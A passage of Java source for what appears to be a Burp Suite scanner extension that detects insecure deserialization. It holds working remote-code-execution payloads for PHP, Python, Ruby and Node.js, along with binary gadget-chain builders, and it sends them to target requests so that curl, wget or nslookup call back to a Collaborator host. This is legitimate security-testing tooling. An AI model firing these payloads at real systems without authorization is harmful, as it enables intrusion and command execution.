                                + "s:11:\"_user_agent\";s:7:\"OmniStr\";}",
                        "PHP SoapClient SSRF"});
                // SoapClient with WSDL mode — triggers HTTP fetch of the WSDL URL on __wakeup
                oobTemplateList.add(new String[]{
                        "O:10:\"SoapClient\":2:{s:3:\"uri\";s:" + ("http://COLLAB_PLACEHOLDER/wsdl".length())
                                + ":\"http://COLLAB_PLACEHOLDER/wsdl\";"
                                + "s:8:\"location\";s:" + ("http://COLLAB_PLACEHOLDER/wsdl".length())
                                + ":\"http://COLLAB_PLACEHOLDER/wsdl\";}",
                        "PHP SoapClient WSDL"});
                // Monolog SocketHandler chain — connects to Collaborator on close/flush
                // Uses real null bytes (\0) for PHP protected properties
                oobTemplateList.add(new String[]{
                        "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\":"
                                + "O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";"
                                + "O:29:\"Monolog\\Handler\\SocketHandler\":2:{s:19:\"\0*\0connectionString\";s:"
                                + ("COLLAB_PLACEHOLDER:80".length()) + ":\"COLLAB_PLACEHOLDER:80\";"
                                + "s:9:\"\0*\0socket\";N;}s:13:\"\0*\0bufferSize\";i:-1;"
                                + "s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;s:4:\"test\";s:5:\"level\";i:100;}}"
                                + "s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;"
                                + "s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}",
                        "Monolog SocketHandler OOB"});
                // Guzzle FnStream → SoapClient: __destruct() calls _fn_close callback → SoapClient.__call() → HTTP
                // Requires guzzlehttp/psr7 (very common via Composer). FnStream.__wakeup() throws but __destruct() still fires.
                oobTemplateList.add(new String[]{
                        "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";"
                                + "a:1:{s:5:\"close\";s:4:\"fake\";}s:9:\"_fn_close\";a:2:{i:0;"
                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
                                + ("http://COLLAB_PLACEHOLDER/guzzle".length())
                                + ":\"http://COLLAB_PLACEHOLDER/guzzle\";}i:1;s:1:\"x\";}}",
                        "Guzzle FnStream + SoapClient OOB"});
                // Laravel PendingBroadcast → SoapClient: __destruct() → dispatch() → SoapClient.__call() → HTTP
                // Uses SoapClient as the events dispatcher (its __call catches any method invocation)
                oobTemplateList.add(new String[]{
                        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";"
                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
                                + ("http://COLLAB_PLACEHOLDER/laravel".length())
                                + ":\"http://COLLAB_PLACEHOLDER/laravel\";}s:8:\"\0*\0event\";s:1:\"x\";}",
                        "Laravel PendingBroadcast + SoapClient OOB"});
                // Yii2 BatchQueryResult → SoapClient: __destruct() → reset() → _dataReader->close() → __call() → HTTP
                oobTemplateList.add(new String[]{
                        "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\0yii\\db\\BatchQueryResult\0_dataReader\";"
                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
                                + ("http://COLLAB_PLACEHOLDER/yii".length())
                                + ":\"http://COLLAB_PLACEHOLDER/yii\";}}",
                        "Yii2 BatchQueryResult + SoapClient OOB"});
                // WordPress WP_HTML_Token → SoapClient: __destruct() → call_user_func(on_destroy) → __call() → HTTP
                // Requires WordPress 6.2+ (WP_HTML_Token class)
                oobTemplateList.add(new String[]{
                        "O:13:\"WP_HTML_Token\":2:{s:13:\"bookmark_name\";s:1:\"x\";s:10:\"on_destroy\";"
                                + "a:2:{i:0;O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
                                + ("http://COLLAB_PLACEHOLDER/wp".length())
                                + ":\"http://COLLAB_PLACEHOLDER/wp\";}i:1;s:1:\"x\";}}",
                        "WordPress WP_HTML_Token + SoapClient OOB"});
                break;
            case "Python":
                // Pickle os.system — nslookup/curl/wget
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
                oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
                // Pickle os.popen — works with plain string (uses shell), unlike subprocess.check_output
                oobTemplateList.add(new String[]{"cos\npopen\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle os.popen nslookup"});
                // Pickle urllib — HTTP GET to Collaborator (no shell needed)
                oobTemplateList.add(new String[]{"curllib.request\nurlopen\n(S'http://COLLAB_PLACEHOLDER/urllib'\ntR.", "Pickle urllib OOB"});
                // Pickle with Python3 builtins.exec + urllib
                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import urllib.request;urllib.request.urlopen(\"http://COLLAB_PLACEHOLDER/exec\")'\ntR.", "Pickle exec urllib OOB"});
                // PyYAML !!python/object — os.system
                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"nslookup COLLAB_PLACEHOLDER\"]", "PyYAML os.system nslookup"});
                oobTemplateList.add(new String[]{"!!python/object/apply:os.system [\"curl http://COLLAB_PLACEHOLDER/yaml\"]", "PyYAML os.system curl"});
                // PyYAML !!python/object — subprocess.Popen
                oobTemplateList.add(new String[]{"!!python/object/apply:subprocess.Popen [[\"nslookup\",\"COLLAB_PLACEHOLDER\"]]", "PyYAML subprocess nslookup"});
                // jsonpickle with os.system
                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"nslookup COLLAB_PLACEHOLDER\"]}]}", "jsonpickle nslookup"});
                oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"curl http://COLLAB_PLACEHOLDER/jp\"]}]}", "jsonpickle curl"});
                // Pickle exec + requests library (common in Python web apps, requires 'requests' package)
                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import requests;requests.get(\"http://COLLAB_PLACEHOLDER/pyreq\")'\ntR.", "Pickle exec requests OOB"});
                // Pickle exec + http.client (Python stdlib, no external dependencies needed)
                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import http.client;http.client.HTTPConnection(\"COLLAB_PLACEHOLDER\").request(\"GET\",\"/\")'\ntR.", "Pickle exec http.client OOB"});
                break;
            case "Ruby":
                // Ruby YAML Gem::Source — @uri triggers HTTP fetch on fetch_spec/download_spec
                // Simple single-document YAML that works with YAML.load / Psych
                oobTemplateList.add(new String[]{
                        "--- !ruby/object:Gem::Source\nuri: http://COLLAB_PLACEHOLDER/gem",
                        "Ruby YAML Gem::Source OOB"});
                // (Removed 8 non-functional Ruby YAML OOB payloads:
                //  - Gem chain: duplicate keys, wrong attribute names, malformed
                //  - Net::FTP/Net::HTTP: don't auto-connect on instantiation
                //  - OpenURI::OpenRead: class doesn't exist
                //  - Complex Gem chain: multiple YAML docs (only first loaded), broken anchors
                //  - Resolv::DNS: doesn't auto-query on instantiation
                //  - ERB x2: doesn't auto-evaluate template on YAML.load)
                break;
            case "Node.js":
                // node-serialize IIFE with require('http')
                oobTemplateList.add(new String[]{
                        "{\"rce\":\"_$$ND_FUNC$$_function(){var http=require('http');"
                                + "http.get('http://COLLAB_PLACEHOLDER/node')}()\"}",
                        "node-serialize HTTP OOB"});
                // node-serialize with child_process — nslookup
                oobTemplateList.add(new String[]{
                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
                                + ".execSync('nslookup COLLAB_PLACEHOLDER')}()\"}",
                        "node-serialize nslookup OOB"});
                // node-serialize with child_process — curl
                oobTemplateList.add(new String[]{
                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
                                + ".execSync('curl http://COLLAB_PLACEHOLDER/node2')}()\"}",
                        "node-serialize curl OOB"});
                // node-serialize with child_process — wget
                oobTemplateList.add(new String[]{
                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process')"
                                + ".execSync('wget http://COLLAB_PLACEHOLDER/node3')}()\"}",
                        "node-serialize wget OOB"});
                // cryo deserialization — HTTP OOB
                oobTemplateList.add(new String[]{
                        "{\"__cryo_type__\":\"Function\","
                                + "\"body\":\"return require('http').get('http://COLLAB_PLACEHOLDER/cryo')\"}",
                        "cryo HTTP OOB"});
                // cryo with child_process
                oobTemplateList.add(new String[]{
                        "{\"__cryo_type__\":\"Function\","
                                + "\"body\":\"return require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')\"}",
                        "cryo nslookup OOB"});
                // funcster deserialization — HTTP OOB
                oobTemplateList.add(new String[]{
                        "{\"__js_function\":\"function(){require('http').get('http://COLLAB_PLACEHOLDER/funcster')}\"}",
                        "funcster HTTP OOB"});
                // funcster with child_process
                oobTemplateList.add(new String[]{
                        "{\"__js_function\":\"function(){require('child_process').execSync('nslookup COLLAB_PLACEHOLDER')}\"}",
                        "funcster nslookup OOB"});
                // js-yaml !!js/function with HTTP
                oobTemplateList.add(new String[]{
                        "!!js/function 'function(){require(\"http\").get(\"http://COLLAB_PLACEHOLDER/jsyaml\")}'",
                        "js-yaml HTTP OOB"});
                // js-yaml !!js/function with child_process
                oobTemplateList.add(new String[]{
                        "!!js/function 'function(){require(\"child_process\").execSync(\"nslookup COLLAB_PLACEHOLDER\")}'",
                        "js-yaml nslookup OOB"});
                // node-serialize with DNS module (no shell)
                oobTemplateList.add(new String[]{
                        "{\"rce\":\"_$$ND_FUNC$$_function(){require('dns').resolve('COLLAB_PLACEHOLDER',function(){})}()\"}",
                        "node-serialize DNS resolve OOB"});
                // Prototype pollution → constructor with OOB
                oobTemplateList.add(new String[]{
                        "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('nslookup COLLAB_PLACEHOLDER');x\"}}}",
                        "Prototype pollution nslookup OOB"});
                break;
            default:
                break;
        }

        String[][] oobTemplates = oobTemplateList.toArray(new String[0][]);

        for (String[] tmpl : oobTemplates) {
            String payloadTemplate = tmpl[0];
            String technique = tmpl[1];

            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "deser-scanner", url, dp.name,
                    "Deser OOB " + dp.language + " " + technique,
                    interaction -> {
                        // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                        // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                        // wait is almost always enough for the sending thread to complete its set() call.
                        for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                        }
                        oobConfirmedParams.add(dp.name);
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        dp.language + " Deserialization RCE (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(dp.name)
                                .evidence("Language: " + dp.language + " | Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description(dp.language + " deserialization RCE confirmed via Burp Collaborator. "
                                        + "The server deserialized the payload and executed the embedded command, "
                                        + "triggering a " + interaction.type().name() + " callback. "
                                        + "Remediation: Do not deserialize untrusted data. Use safe alternatives "
                                        + "(JSON with strict typing, signed serialization, allowlist-based filters).")
                                .payload(payloadTemplate)
                                .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                                .build());
                        api.logging().logToOutput("[Deser OOB] Confirmed! " + dp.language + " " + technique
                                + " at " + url + " param=" + dp.name);
                    }
            );

            if (collabPayload == null) continue;

            String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);

            // Fix PHP serialized string lengths after COLLAB_PLACEHOLDER replacement.
            // PHP unserialize() requires exact byte lengths in s:XX:"..." format.
            // Template uses COLLAB_PLACEHOLDER (18 chars) but actual Collaborator domain varies.
            if ("PHP".equals(dp.language)) {
                payload = fixPhpSerializedLengths(payload);
            }

            // Try multiple encodings
            String[] encodedPayloads = {
                    payload,                                                    // Raw
                    Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8)), // Base64
                    URLEncoder.encode(payload, StandardCharsets.UTF_8),          // URL encoded
            };

            for (String encoded : encodedPayloads) {
                HttpRequestResponse result = sendPayload(original, dp, encoded);
                sentRequest.compareAndSet(null, result); // Capture the first encoding's send result
                perHostDelay();
            }
        }

        // ==================== BINARY OOB PAYLOADS ====================
        // For formats where Collaborator URL must be embedded in binary structures.
        // These are built dynamically since binary length-prefixed fields can't use string replacement.

        if ("Ruby".equals(dp.language)) {
            // Ruby Marshal binary payloads — for apps using Marshal.load (not YAML.load)
            // ERB payloads removed: ERB doesn't auto-evaluate template on Marshal.load
            String[][] rubyBinaryOob = {
                    {"gemsource", "Ruby Marshal Gem::Source @uri"},
                    {"gadget_nslookup", "Ruby Marshal Gadget chain nslookup"},
                    {"gadget_curl", "Ruby Marshal Gadget chain curl"},
                    {"gadget_wget", "Ruby Marshal Gadget chain wget"},
            };

            for (String[] rb : rubyBinaryOob) {
                String type = rb[0];
                String technique = rb[1];

                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
                String collabDomain = collaboratorManager.generatePayload(
                        "deser-scanner", url, dp.name,
                        "Deser OOB " + technique,
                        interaction -> {
                            oobConfirmedParams.add(dp.name);
                            findingsStore.addFinding(Finding.builder("deser-scanner",
                                            "Ruby Deserialization RCE (Out-of-Band, Marshal binary)",
                                            Severity.CRITICAL, Confidence.CERTAIN)
                                    .url(url).parameter(dp.name)
                                    .evidence("Technique: " + technique
                                            + " | Collaborator " + interaction.type().name()
                                            + " interaction from " + interaction.clientIp())
                                    .description("Ruby deserialization RCE confirmed via Burp Collaborator. "
                                            + "Marshal.load processed the binary gadget chain and triggered "
                                            + "a " + interaction.type().name() + " callback. "
                                            + "Remediation: Use JSON.parse or YAML.safe_load instead of Marshal.load.")
                                    .requestResponse(binarySentRequest.get())
                                    .build());
                            api.logging().logToOutput("[Deser OOB] Confirmed! Ruby Marshal binary " + technique
                                    + " at " + url + " param=" + dp.name);
                        }
                );
                if (collabDomain == null) continue;

                byte[] binaryPayload;
                switch (type) {
                    case "gemsource":
                        binaryPayload = buildMarshalObject("Gem::Source",
                                new String[]{"@uri"},
                                new String[]{"http://" + collabDomain + "/gem"});
                        break;
                    case "gadget_nslookup":
                        binaryPayload = buildMarshalGadgetChain("nslookup " + collabDomain);
                        break;
                    case "gadget_curl":
                        binaryPayload = buildMarshalGadgetChain("curl http://" + collabDomain + "/rce");
                        break;
                    case "gadget_wget":
                        binaryPayload = buildMarshalGadgetChain("wget http://" + collabDomain + "/rce");
                        break;
                    default:
                        continue;
                }

                if (binaryPayload.length == 0) continue;
                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);

                // Send base64 (primary — cookie values are typically base64-encoded Marshal)
                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
                binarySentRequest.set(result);
                perHostDelay();

                // Also try URL-encoded base64
                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
                perHostDelay();
            }
        }

        if ("Python".equals(dp.language)) {
            // Python Pickle protocol 2 binary payloads — for apps expecting binary pickle
            String[][] pythonBinaryOob = {
                    {"os", "system", "nslookup ", "Pickle P2 nslookup"},
                    {"os", "system", "curl http://", "Pickle P2 curl"},
                    {"os", "system", "wget http://", "Pickle P2 wget"},
                    {"os", "popen", "nslookup ", "Pickle P2 os.popen nslookup"},
            };

            for (String[] pb : pythonBinaryOob) {
                String module = pb[0];
                String function = pb[1];
                String cmdPrefix = pb[2];
                String technique = pb[3];

                AtomicReference<HttpRequestResponse> binarySentRequest = new AtomicReference<>();
                String collabDomain = collaboratorManager.generatePayload(
                        "deser-scanner", url, dp.name,
                        "Deser OOB " + technique,
                        interaction -> {
                            oobConfirmedParams.add(dp.name);
                            findingsStore.addFinding(Finding.builder("deser-scanner",
                                            "Python Deserialization RCE (Out-of-Band, Pickle binary)",
                                            Severity.CRITICAL, Confidence.CERTAIN)
                                    .url(url).parameter(dp.name)
                                    .evidence("Technique: " + technique
                                            + " | Collaborator " + interaction.type().name()
                                            + " interaction from " + interaction.clientIp())
                                    .description("Python deserialization RCE confirmed via Burp Collaborator. "
                                            + "pickle.loads() processed the binary payload and executed the command, "
                                            + "triggering a " + interaction.type().name() + " callback. "
                                            + "Remediation: Use json.loads() or yaml.safe_load(). Never unpickle untrusted data.")
                                    .requestResponse(binarySentRequest.get())
                                    .build());
                            api.logging().logToOutput("[Deser OOB] Confirmed! Python Pickle binary " + technique
                                    + " at " + url + " param=" + dp.name);
                        }
                );
                if (collabDomain == null) continue;

                String fullArg = cmdPrefix.contains("http://")
                        ? cmdPrefix + collabDomain + "/pickle"
                        : cmdPrefix + collabDomain;
                byte[] binaryPayload = buildPickleProtocol2(module, function, fullArg);
                if (binaryPayload.length == 0) continue;

                String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
                HttpRequestResponse result = sendPayload(original, dp, base64Payload);
                binarySentRequest.set(result);
                perHostDelay();

                sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
                perHostDelay();
            }
        }
    }

    // ==================== BINARY PAYLOAD BUILDERS ====================

    /**
     * Encode integer in Ruby Marshal v4.8 format.
     */
    private static byte[] marshalInt(int n) {
        if (n == 0) return new byte[]{0};
        if (n > 0 && n <= 122) return new byte[]{(byte)(n + 5)};
        if (n > 0 && n <= 255) return new byte[]{1, (byte) n};
        if (n > 0 && n <= 65535) return new byte[]{2, (byte)(n & 0xff), (byte)((n >> 8) & 0xff)};
        return new byte[]{4, (byte)(n & 0xff), (byte)((n >> 8) & 0xff),
                (byte)((n >> 16) & 0xff), (byte)((n >> 24) & 0xff)};
    }

    /**
     * Build a Ruby Marshal v4.8 object with string instance variables.
     * Constructs: \x04\x08 o :className ivarCount [:ivarName I"value encoding]...
     */
    private static byte[] buildMarshalObject(String className, String[] ivarNames, String[] ivarValues) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            out.write(new byte[]{0x04, 0x08}); // Marshal header v4.8
            out.write('o'); // Object

            // Class name symbol
            byte[] classBytes = className.getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(classBytes.length));
            out.write(classBytes);

            // Instance variable count
            out.write(marshalInt(ivarNames.length));

            // Each ivar
            for (int i = 0; i < ivarNames.length; i++) {
                // Ivar name symbol
                byte[] nameBytes = ivarNames[i].getBytes(StandardCharsets.US_ASCII);
                out.write(':');
                out.write(marshalInt(nameBytes.length));
                out.write(nameBytes);

                // String value with UTF-8 encoding tag
                byte[] valBytes = ivarValues[i].getBytes(StandardCharsets.UTF_8);
                out.write('I'); // Ivar container
                out.write('"'); // Raw string
                out.write(marshalInt(valBytes.length));
                out.write(valBytes);
                // 1 encoding ivar: E = true (UTF-8)
                out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});
            }
            return out.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    /**
     * Build a Ruby Marshal v4.8 Gem::Requirement → Gem::DependencyList → Gem::StubSpecification chain.
     * This is the classic auto-trigger gadget: StubSpecification.loaded_from triggers Kernel.open()
     * when the requirement is compared or inspected.
     */
    private static byte[] buildMarshalGadgetChain(String command) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            out.write(new byte[]{0x04, 0x08}); // Header

            // Outer: Gem::Requirement object
            out.write('o');
            byte[] reqClass = "Gem::Requirement".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(reqClass.length));
            out.write(reqClass);
            out.write(marshalInt(1)); // 1 ivar

            // @requirements = [Gem::DependencyList]
            byte[] reqIvar = "@requirements".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(reqIvar.length));
            out.write(reqIvar);

            // Array of 1 element
            out.write('[');
            out.write(marshalInt(1));

            // Inner: Gem::DependencyList
            out.write('o');
            byte[] depClass = "Gem::DependencyList".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(depClass.length));
            out.write(depClass);
            out.write(marshalInt(1)); // 1 ivar

            // @specs = [StubSpecification]
            byte[] specsIvar = "@specs".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(specsIvar.length));
            out.write(specsIvar);

            // Array of 1 element
            out.write('[');
            out.write(marshalInt(1));

            // Innermost: Gem::StubSpecification
            out.write('o');
            byte[] stubClass = "Gem::StubSpecification".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(stubClass.length));
            out.write(stubClass);
            out.write(marshalInt(2)); // 2 ivars

            // @loaded_from = "|command" (triggers Kernel.open)
            byte[] loadedIvar = "@loaded_from".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(loadedIvar.length));
            out.write(loadedIvar);
            byte[] cmdBytes = ("| " + command).getBytes(StandardCharsets.UTF_8);
            out.write('I');
            out.write('"');
            out.write(marshalInt(cmdBytes.length));
            out.write(cmdBytes);
            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});

            // @name = "x" (any value)
            byte[] nameIvar = "@name".getBytes(StandardCharsets.US_ASCII);
            out.write(':');
            out.write(marshalInt(nameIvar.length));
            out.write(nameIvar);
            byte[] nameVal = "x".getBytes(StandardCharsets.UTF_8);
            out.write('I');
            out.write('"');
            out.write(marshalInt(nameVal.length));
            out.write(nameVal);
            out.write(new byte[]{0x06, 0x3a, 0x06, 0x45, 0x54});

            return out.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    /**
     * Build Python Pickle protocol 2 payload: module.function(arg)
     */
    private static byte[] buildPickleProtocol2(String module, String function, String arg) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            out.write(new byte[]{(byte) 0x80, 0x02}); // Protocol 2 header
            // GLOBAL: push module.function
            out.write(('c' + module + "\n" + function + "\n").getBytes(StandardCharsets.US_ASCII));
            out.write('('); // MARK
            out.write('X'); // BINUNICODE
            byte[] argBytes = arg.getBytes(StandardCharsets.UTF_8);
            // 4-byte little-endian length
            out.write(argBytes.length & 0xff);
            out.write((argBytes.length >> 8) & 0xff);
            out.write((argBytes.length >> 16) & 0xff);
            out.write((argBytes.length >> 24) & 0xff);
            out.write(argBytes);
            out.write(new byte[]{'t', 'R', '.'}); // TUPLE, REDUCE, STOP
            return out.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    /**
     * Send a binary OOB payload with Collaborator tracking.
     * Handles Collaborator generation, callback registration, and encoding (base64 + URL-encoded).
     */
    private void sendBinaryOobPayload(HttpRequestResponse original, DeserPoint dp, String url,
                                       byte[] binaryPayload, String technique) throws InterruptedException {
        if (binaryPayload == null || binaryPayload.length == 0) return;

        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
        // No separate collab needed — URL is already embedded in the binary
        String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);

        // Send base64 (primary — most deser expects base64)
        HttpRequestResponse result = sendPayload(original, dp, base64Payload);
        sentRequest.set(result);
        perHostDelay();

        // Also try URL-encoded base64
        sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
        perHostDelay();
    }

    // ==================== HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, DeserPoint dp, String payload) {
        try {
            // If the original value was base64-encoded, wrap the payload in base64 to match.
            // Skip if payload is already base64 (binary Java/Python/.NET payloads).
            if (dp.encoding != null && dp.encoding.contains("base64") && !dp.encoding.contains("json") && !isAlreadyBase64(payload)) {
                payload = Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
            }

            // JSON wrapping: re-serialize payload into the original JSON structure
            if (dp.encoding != null && dp.encoding.contains("json") && dp.jsonKey != null) {
                payload = wrapPayloadInJson(dp, payload);
                if (payload == null) return null;
            }

            HttpRequest request = original.request();
            HttpRequest modified;

            switch (dp.location) {
                case "cookie":
                    modified = PayloadEncoder.injectCookie(request, dp.name, payload);
                    break;
                case "body_param":
                    modified = request.withUpdatedParameters(
                            HttpParameter.bodyParameter(dp.name, PayloadEncoder.encode(payload)));
                    break;
                case "url_param":
                    modified = request.withUpdatedParameters(
                            HttpParameter.urlParameter(dp.name, PayloadEncoder.encode(payload)));
                    break;
                case "header":
                    // Sanitize CRLF to prevent header injection
                    String safeHeaderVal = payload.replace("\r", "").replace("\n", "");
                    modified = request.withRemovedHeader(dp.name).withAddedHeader(dp.name, safeHeaderVal);
                    break;
                case "body":
                    // For ViewState and raw body injection
                    String body = request.bodyToString();
                    if (body != null && body.contains(dp.value)) {
                        body = body.replace(dp.value, payload);
                    }
                    modified = request.withBody(body != null ? body : payload);
                    break;
                default:
                    return null;
            }

            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private long measureTime(HttpRequestResponse original, DeserPoint dp, String payload) {
        long start = System.currentTimeMillis();
        sendPayload(original, dp, payload);
        return System.currentTimeMillis() - start;
    }

    private void reportPassiveFinding(List<Finding> findings, String url, String param,
                                       String title, String language, String evidence) {
        findings.add(Finding.builder("deser-scanner", title,
                        Severity.HIGH, Confidence.FIRM)
                .url(url).parameter(param)
                .evidence(evidence)
                .description(language + " serialized data detected. This is a potential deserialization attack surface. "
                        + "Remediation: Replace native serialization with safe alternatives "
                        + "(JSON with strict typing, protobuf, or signed serialization).")
                .build());
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Recalculates PHP serialized string lengths (s:XX:"...") after placeholder replacement.
     * PHP's unserialize() requires exact byte lengths — when COLLAB_PLACEHOLDER (18 chars) is
     * replaced with the actual Collaborator domain (variable length), s:XX prefixes become wrong.
     * Only matches string entries (s:), not objects (O:) or arrays (a:).
     */
    private static String fixPhpSerializedLengths(String serialized) {
        java.util.regex.Matcher m = java.util.regex.Pattern.compile("s:(\\d+):\"([^\"]*)\"")
                .matcher(serialized);
        StringBuilder sb = new StringBuilder();
        while (m.find()) {
            String value = m.group(2);
            m.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(
                    "s:" + value.length() + ":\"" + value + "\""));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    /**
     * Attempts to base64-decode a value (standard, URL-safe, and URL-encoded variants).
     * Handles real-world cases where apps URL-encode base64 padding (e.g. %3d%3d for ==)
     * or use + encoded as %2b, / as %2f, etc.
     * Returns the decoded string (ISO-8859-1 to preserve all bytes) or null.
     */
    private String tryBase64Decode(String value) {
        if (value == null || value.length() < 4) return null;
        String cleaned = value.trim();

        // Try raw value first (fastest path)
        String result = tryBase64DecodeRaw(cleaned);
        if (result != null) return result;

        // URL-decode then retry — catches %3d%3d (==), %2b (+), %2f (/), %3d (=)
        if (cleaned.contains("%")) {
            try {
                String urlDecoded = java.net.URLDecoder.decode(cleaned, StandardCharsets.UTF_8);
                if (!urlDecoded.equals(cleaned)) {
                    result = tryBase64DecodeRaw(urlDecoded.trim());
                    if (result != null) return result;
                }
            } catch (Exception ignored) {}
        }

        // Handle mixed: some apps double-encode or use non-standard padding
        // Strip trailing whitespace/newlines and retry
        String stripped = cleaned.replaceAll("[\\r\\n\\s]+", "");
        if (!stripped.equals(cleaned)) {
            result = tryBase64DecodeRaw(stripped);
            if (result != null) return result;
        }

        return null;
    }

    /** Raw base64 decode attempt — standard then URL-safe alphabet. */
    private String tryBase64DecodeRaw(String value) {
        try {
            byte[] decoded = Base64.getDecoder().decode(value);
            if (decoded.length >= 2) return new String(decoded, StandardCharsets.ISO_8859_1);
        } catch (Exception ignored) {}
        try {
            byte[] decoded = Base64.getUrlDecoder().decode(value);
            if (decoded.length >= 2) return new String(decoded, StandardCharsets.ISO_8859_1);
        } catch (Exception ignored) {}
        return null;
    }

    /**
     * URL-decodes a value. Returns null if decoding fails or the result is identical to input.
     */
    private String tryUrlDecode(String value) {
        if (value == null || !value.contains("%")) return null;
        try {
            String decoded = java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
            return decoded.equals(value) ? null : decoded;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Scans a string value against ALL language deserialization patterns.
     * Returns a list of detected DeserPoints. Used to avoid duplicating pattern checks
     * for raw, URL-decoded, and base64-decoded values.
     *
     * @param text       The text to scan (could be raw, URL-decoded, or base64-decoded)
     * @param location   Where this value came from (cookie, header, body_param, url_param, body)
     * @param name       Parameter/cookie/header name
     * @param url        Target URL
     * @param encoding   "none", "urldecoded", "base64", "urldecoded+base64"
     * @param findings   List to append passive findings to
     * @return           List of DeserPoints found
     */
    private List<DeserPoint> scanForAllPatterns(String text, String location, String name,
                                                 String url, String encoding, List<Finding> findings) {
        List<DeserPoint> found = new ArrayList<>();
        if (text == null || text.length() < 3) return found;

        String encodingLabel = "none".equals(encoding) ? "" : " (" + encoding + ")";

        // Java core
        if (JAVA_MAGIC_BYTES_B64.matcher(text).find() || JAVA_MAGIC_BYTES_HEX.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "Java serialized object" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Java serialized data in " + location + encodingLabel, "Java",
